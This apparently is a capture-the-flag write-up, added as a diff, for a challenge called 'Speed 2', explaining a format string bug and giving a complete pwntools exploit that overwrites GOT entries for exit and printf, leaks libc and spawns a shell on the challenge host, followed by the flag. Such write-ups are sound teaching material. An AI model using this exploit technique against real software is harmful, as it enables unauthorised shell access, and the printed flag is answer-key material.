@@ -1,0 +1,122 @@
+# Speed 2
+
+## Challenge
+
+We're given a binary with partial RELRO and no PIE.
+
+### Checksec
+
+```
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+## Solution
+
+There is a format string vulnerability in the binary, as it calls `printf` directly on user input.
+
+We are only given one `printf` call before the program exits.
+We can extend this by overwriting the GOT entry of `exit` to return to the vulnerable code.
+This gives us unlimited uses of the vulnerability.
+
+We can then leak the libc address and overwrite the GOT entry of `printf` with `system`.
+This overwrite has to be done in a single pass, as we will not have access to `printf` afterwards.
+
+Once the GOT entry of `printf` is overwritten, we can send `"/bin/sh"` as our input.
+This will cause the program to execute `system("/bin/sh")` and spawn a shell.
+
+## Exploit
+
+```py
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+# $ pwn template --host speed-02.hfsc.tf --port 21000 speed2
+from pwn import *
+
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF('speed2')
+
+# Many built-in settings can be controlled on the command-line and show up
+# in "args".  For example, to dump all data sent/received, and disable ASLR
+# for all created processes...
+# ./exploit.py DEBUG NOASLR
+# ./exploit.py GDB HOST=example.com PORT=4141
+host = args.HOST or 'speed-02.hfsc.tf'
+port = int(args.PORT or 21000)
+
+def start_local(argv=[], *a, **kw):
+    '''Execute the target binary locally'''
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+def start_remote(argv=[], *a, **kw):
+    '''Connect to the process on the remote host'''
+    io = connect(host, port)
+    if args.GDB:
+        gdb.attach(io, gdbscript=gdbscript)
+    return io
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.LOCAL:
+        return start_local(argv, *a, **kw)
+    else:
+        return start_remote(argv, *a, **kw)
+
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+gdbscript = '''
+tbreak *0x{exe.entry:x}
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+# Arch:     i386-32-little
+# RELRO:    Partial RELRO
+# Stack:    Canary found
+# NX:       NX enabled
+# PIE:      No PIE (0x8048000)
+
+libc = ELF('libc.so.6')
+
+io = start()
+
+io.sendlineafter(b"f5b: ", fmtstr_payload(7, {exe.got['exit']: 0x0804928f}))
+
+fmt = flat({
+    0x0: b"%15$s",
+    0x20: exe.got['printf'],
+    })
+io.sendlineafter(b"f5b: ", fmt)
+
+libc.address = unpack(io.recv(4)) - libc.sym['printf']
+
+print(hex(libc.address))
+
+write1 = libc.sym['system'] % 0x10000
+write2 = libc.sym['system'] // 0x10000
+
+fmt = flat({
+    0x0: "%{}c%15$hn%{}c%16$hhn".format(write1, (write2 - write1) % 0x100).encode(),
+    0x20: exe.got['printf'],
+    0x24: exe.got['printf'] + 2,
+    })
+
+io.sendlineafter(b"f5b: ", fmt)
+io.interactive()
+```
+
+## Flag
+
+```
+midnight{21621f6151007a4bdf38846bba844904}
+```
